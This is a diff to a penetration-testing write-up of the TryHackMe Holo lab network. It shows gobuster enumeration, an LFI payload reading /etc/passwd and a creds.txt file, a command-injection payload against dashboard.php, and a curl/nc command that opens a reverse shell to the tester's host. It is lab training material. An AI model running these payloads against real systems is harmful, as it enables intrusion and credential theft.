@@ -1,6 +1,7 @@
 # External Penetration Testing - Holo Corporate Network - TryHackMe - Holo Network
 
 > Austin Lai | September 20th, 2021
+> Updated    | September 21st, 2021
 
 ---
 
@@ -160,7 +161,9 @@ The report has included below section in general for your references:
 
 ### Brief WriteUp Add-on for Report
 
-Information gathering - basic network scan for host alive:
+Information gathering:
+
+As we been given the scope of engagement for Holo network 10.200.107.0/24, we will first performed basic network scan for host alive.
 
 <details><summary>nmap result</summary>
 
@@ -213,7 +216,7 @@ Host is up, received syn-ack (0.33s latency).
 
 </details>
 
-Information gathering - detail rustscan for target 10.200.107.33:
+Once we identify the host, we perform a detail rustscan - in this case, the target of host which is alive is 10.200.107.33:
 
 <details><summary>rustscan result</summary>
 
@@ -845,10 +848,214 @@ Nmap done: 1 IP address (1 host up) scanned in 253.77 seconds
 
 </details>
 
+In the meantime, let's fire up gobuster dir search on our target:
 
+<details><summary>result of gobuster dir for 10.200.107.33</summary>
 
+```
+sudo gobuster -t 15 --delay 100ms dir -e -u "http://10.200.107.33" -o TryHackMe-gobuster-dir-10.200.107.33 -w ~/Desktop/TryHackMe-Holo-Network-Premium-Completed/big.txt
 
+http://10.200.107.33/!                    (Status: 301) [Size: 0] [--> http://10.200.107.33/]
+http://10.200.107.33/.htpasswd            (Status: 403) [Size: 278]
+http://10.200.107.33/0                    (Status: 301) [Size: 0] [--> http://10.200.107.33/0/]
+http://10.200.107.33/.htaccess            (Status: 403) [Size: 278]
+http://10.200.107.33/admin                (Status: 302) [Size: 0] [--> http://www.holo.live/wp-admin/]
+http://10.200.107.33/asdfjkl;             (Status: 301) [Size: 0] [--> http://10.200.107.33/asdfjkl]
+http://10.200.107.33/dashboard            (Status: 302) [Size: 0] [--> http://www.holo.live/wp-admin/]
+http://10.200.107.33/favicon.ico          (Status: 302) [Size: 0] [--> http://www.holo.live/wp-includes/images/w-logo-blue-white-bg.png]
+http://10.200.107.33/fixed!               (Status: 301) [Size: 0] [--> http://10.200.107.33/fixed]
+http://10.200.107.33/javascript           (Status: 301) [Size: 319] [--> http://10.200.107.33/javascript/]
+http://10.200.107.33/login                (Status: 302) [Size: 0] [--> http://www.holo.live/wp-login.php]
+http://10.200.107.33/robots.txt           (Status: 200) [Size: 913]
+http://10.200.107.33/server-status        (Status: 403) [Size: 278]
+http://10.200.107.33/upgrade              (Status: 301) [Size: 316] [--> http://10.200.107.33/upgrade/]
+http://10.200.107.33/wp-admin             (Status: 403) [Size: 278]
+http://10.200.107.33/wp-content           (Status: 301) [Size: 319] [--> http://10.200.107.33/wp-content/]
+http://10.200.107.33/wp-includes          (Status: 301) [Size: 320] [--> http://10.200.107.33/wp-includes/]
+http://10.200.107.33/wp-login             (Status: 403) [Size: 278]
+```
 
+</details>
+
+From the rustscan result, we have quite a few details worth to check out.
+
+- robots.txt --- however it does not contain any useful information
+- we got hostname and domain --- ` holo.live ` and ` www.holo.live `
+
+Let's add the hostname and domain of our target into host file -> ` sudo sed -i.bak '$a10.200.107.33 holo.live www.holo.live' /etc/hosts && cat /etc/hosts && ls -l /etc/hosts* `
+
+We also fire up gobuster vhost scan to check if there is additional sub-domain can be found:
+
+<details><summary>result of gobuster vhost for holo.live domain</summary>
+
+```bash
+sudo gobuster -t 15 --delay 100ms vhost -u "holo.live" -o TryHackMe-gobuster-vhost-holo.live -w ~/Desktop/TryHackMe-Holo-Network-Premium-Completed/subdomains-top1million-110000.txt
+
+Found: www.holo.live (Status: 200) [Size: 21405]
+Found: dev.holo.live (Status: 200) [Size: 7515]
+Found: admin.holo.live (Status: 200) [Size: 1845]
+Found: gc._msdcs.holo.live (Status: 400) [Size: 422]
+```
+
+</details>
+
+Seem like we found additional sub-domain available, let's add to our host file -> ` sudo sed -i.bak 's/$/ admin.holo.live dev.holo.live/' /etc/hosts && cat /etc/hosts && ls -l /etc/hosts* `
+
+Now we scan enumerate all the sub-domain, you may use basic gobuster dir scan, however since we know we can read robots text, in our case we speific gobuster to search with file extension.
+
+<details><summary>result of gobuster dir with file extension for www.holo.live</summary>
+
+```bash
+sudo gobuster -t 15 --delay 100ms dir -e -u "http://www.holo.live" -o TryHackMe-gobuster-dir-file-www.holo.live -w ~/Desktop/TryHackMe-Holo-Network-Premium-Completed/big.txt -x txt,php
+
+http://www.holo.live/.htpasswd.txt        (Status: 403) [Size: 278]
+http://www.holo.live/.htpasswd.php        (Status: 403) [Size: 278]
+http://www.holo.live/.htpasswd            (Status: 403) [Size: 278]
+http://www.holo.live/.htaccess.txt        (Status: 403) [Size: 278]
+http://www.holo.live/0                    (Status: 301) [Size: 0] [--> http://www.holo.live/0/]
+http://www.holo.live/.htaccess.php        (Status: 403) [Size: 278]
+http://www.holo.live/.htaccess            (Status: 403) [Size: 278]
+http://www.holo.live/!                    (Status: 301) [Size: 0] [--> http://www.holo.live/]
+http://www.holo.live/admin                (Status: 302) [Size: 0] [--> http://www.holo.live/wp-admin/]
+http://www.holo.live/asdfjkl;             (Status: 301) [Size: 0] [--> http://www.holo.live/asdfjkl]
+http://www.holo.live/dashboard            (Status: 302) [Size: 0] [--> http://www.holo.live/wp-admin/]
+http://www.holo.live/favicon.ico          (Status: 302) [Size: 0] [--> http://www.holo.live/wp-includes/images/w-logo-blue-white-bg.png]
+http://www.holo.live/fixed!               (Status: 301) [Size: 0] [--> http://www.holo.live/fixed]
+http://www.holo.live/index.php            (Status: 301) [Size: 0] [--> http://www.holo.live/]
+http://www.holo.live/javascript           (Status: 301) [Size: 319] [--> http://www.holo.live/javascript/]
+http://www.holo.live/license.txt          (Status: 200) [Size: 19915]
+http://www.holo.live/login                (Status: 302) [Size: 0] [--> http://www.holo.live/wp-login.php]
+http://www.holo.live/robots.txt           (Status: 200) [Size: 913]
+http://www.holo.live/robots.txt           (Status: 200) [Size: 913]
+http://www.holo.live/server-status        (Status: 403) [Size: 278]
+http://www.holo.live/upgrade              (Status: 301) [Size: 316] [--> http://www.holo.live/upgrade/]
+http://www.holo.live/wp-admin             (Status: 403) [Size: 278]
+http://www.holo.live/wp-admin.php         (Status: 403) [Size: 278]
+http://www.holo.live/wp-content           (Status: 301) [Size: 319] [--> http://www.holo.live/wp-content/]
+http://www.holo.live/wp-config.php        (Status: 200) [Size: 0]
+http://www.holo.live/wp-login             (Status: 403) [Size: 278]
+http://www.holo.live/wp-includes          (Status: 301) [Size: 320] [--> http://www.holo.live/wp-includes/]
+http://www.holo.live/wp-register.php      (Status: 301) [Size: 0] [--> http://www.holo.live/wp-login.php?action=register]
+http://www.holo.live/wp-feed.php          (Status: 301) [Size: 0] [--> http://www.holo.live/index.php/feed/]
+http://www.holo.live/wp-login.php         (Status: 403) [Size: 278]
+http://www.holo.live/wp-rss2.php          (Status: 301) [Size: 0] [--> http://www.holo.live/index.php/feed/]
+http://www.holo.live/wp-trackback.php     (Status: 200) [Size: 135]
+http://www.holo.live/xmlrpc.php           (Status: 405) [Size: 42]
+```
+
+</details>
+
+<details><summary>result of gobuster dir with file extension for admin.holo.live</summary>
+
+```bash
+sudo gobuster -t 15 --delay 100ms dir -e -u "http://admin.holo.live" -o TryHackMe-gobuster-dir-file-admin.holo.live -w ~/Desktop/TryHackMe-Holo-Network-Premium-Completed/big.txt -x txt,php
+
+http://admin.holo.live/.htaccess            (Status: 403) [Size: 280]
+http://admin.holo.live/.htaccess.txt        (Status: 403) [Size: 280]
+http://admin.holo.live/.htaccess.php        (Status: 403) [Size: 280]
+http://admin.holo.live/.htpasswd.txt        (Status: 403) [Size: 280]
+http://admin.holo.live/.htpasswd.php        (Status: 403) [Size: 280]
+http://admin.holo.live/.htpasswd            (Status: 403) [Size: 280]
+http://admin.holo.live/assets               (Status: 301) [Size: 319] [--> http://admin.holo.live/assets/]
+http://admin.holo.live/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
+http://admin.holo.live/db_connect.php       (Status: 200) [Size: 0]
+http://admin.holo.live/docs                 (Status: 301) [Size: 317] [--> http://admin.holo.live/docs/]
+http://admin.holo.live/examples             (Status: 301) [Size: 321] [--> http://admin.holo.live/examples/]
+http://admin.holo.live/index.php            (Status: 200) [Size: 1845]
+http://admin.holo.live/javascript           (Status: 301) [Size: 323] [--> http://admin.holo.live/javascript/]
+http://admin.holo.live/robots.txt           (Status: 200) [Size: 135]
+http://admin.holo.live/robots.txt           (Status: 200) [Size: 135]
+http://admin.holo.live/server-status        (Status: 403) [Size: 280]
+```
+
+</details>
+
+<details><summary>result of gobuster dir with file extension for dev.holo.live</summary>
+
+```bash
+sudo gobuster -t 15 --delay 100ms dir -e -u "http://dev.holo.live" -o TryHackMe-gobuster-dir-file-dev.holo.live -w ~/Desktop/TryHackMe-Holo-Network-Premium-Completed/big.txt -x txt,php
+
+http://dev.holo.live/.htaccess            (Status: 403) [Size: 278]
+http://dev.holo.live/.htaccess.txt        (Status: 403) [Size: 278]
+http://dev.holo.live/.htaccess.php        (Status: 403) [Size: 278]
+http://dev.holo.live/.htpasswd            (Status: 403) [Size: 278]
+http://dev.holo.live/.htpasswd.txt        (Status: 403) [Size: 278]
+http://dev.holo.live/.htpasswd.php        (Status: 403) [Size: 278]
+http://dev.holo.live/about.php            (Status: 200) [Size: 9612]
+http://dev.holo.live/admin                (Status: 403) [Size: 278]
+http://dev.holo.live/admin.php            (Status: 403) [Size: 278]
+http://dev.holo.live/css                  (Status: 301) [Size: 312] [--> http://dev.holo.live/css/]
+http://dev.holo.live/fonts                (Status: 301) [Size: 314] [--> http://dev.holo.live/fonts/]
+http://dev.holo.live/images               (Status: 301) [Size: 315] [--> http://dev.holo.live/images/]
+http://dev.holo.live/img.php              (Status: 200) [Size: 0]
+http://dev.holo.live/index.php            (Status: 200) [Size: 7515]
+http://dev.holo.live/javascript           (Status: 301) [Size: 319] [--> http://dev.holo.live/javascript/]
+http://dev.holo.live/js                   (Status: 301) [Size: 311] [--> http://dev.holo.live/js/]
+http://dev.holo.live/login                (Status: 403) [Size: 278]
+http://dev.holo.live/login.php            (Status: 403) [Size: 278]
+http://dev.holo.live/server-status        (Status: 403) [Size: 278]
+```
+
+</details>
+
+From the gobuster result, we know that admin.holo.live do have robots.txt and it contain an interesting file called "creds.txt"
+
+```
+User-agent: *
+Disallow: /var/www/admin/db.php
+Disallow: /var/www/admin/dashboard.php
+Disallow: /var/www/admin/supersecretdir/creds.txt
+```
+
+From here, we know probably we can retireve the file by exploiting Local File Inclusion vulnerability in PHP.
+
+However, we are unable to retrieve the file as admin.holo.live is a login page.
+
+Let's check out dev.holo.live, if the Local File Inclusion vulnerability can be found.
+
+Main page of dev.holo.live:
+
+![dev.holo.live](dev.holo.live.png)
+
+Talent page of dev.holo.live:
+
+![talent-dev.holo.live](talent-dev.holo.live.png)
+
+![talent-1-dev.holo.live](talent-1-dev.holo.live.png)
+
+Source for talent page of dev.holo.live:
+
+![source-talent-dev.holo.live](source-talent-dev.holo.live.png)
+
+Looking at the source for talent page of dev.holo.live, we have notice there is a possibly of Local File Inclusion vulnerability --- ` img.php?file= `.
+
+Let's try out --- the payload we used ` http://dev.holo.live/img.php?file=../../../etc/passwd `:
+
+![lfi-img.php-dev.holo.live](lfi-img.php-dev.holo.live.png)
+
+Now, let's modified our payload -> ` http://dev.holo.live/img.php?file=../../../var/www/admin/supersecretdir/creds.txt `. This will allow us try to retreive the creds.txt stated in robots.txt of admin.holo.live as we know development environment usually is a repication of production environment.
+
+![creds-img.php-dev.holo.live](creds-img.php-dev.holo.live.png)
+
+Now we get a credentials, let's try to login to admin.holo.live:
+
+![login-success-admin.holo.live](login-success-admin.holo.live.png)
+
+Once we login, we check on the source of dashboard.php, right away we notice there is PHP Rmote Code Execution ([OWASP Command Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)) under the comment for "visitor visted today" --- ` <!-- //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->" `
+
+Let's try out --- the payload we used ` http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22 `:
+
+![rce-1-dashboard.php-admin.holo.live](rce-1-dashboard.php-admin.holo.live.png)
+
+![rce-2-dashboard.php-admin.holo.live](rce-2-dashboard.php-admin.holo.live.png)
+
+Let's modofied our payload to get reverse shell -> ` http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `.
+
+We are using curl to perform this exploit to get our reverse shell -> ` curl http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `.
+
+Reverse shell - called back from admin.holo.live:
+
+![reverse-shell-admin.holo.live](reverse-shell-admin.holo.live.png)
 
 
 
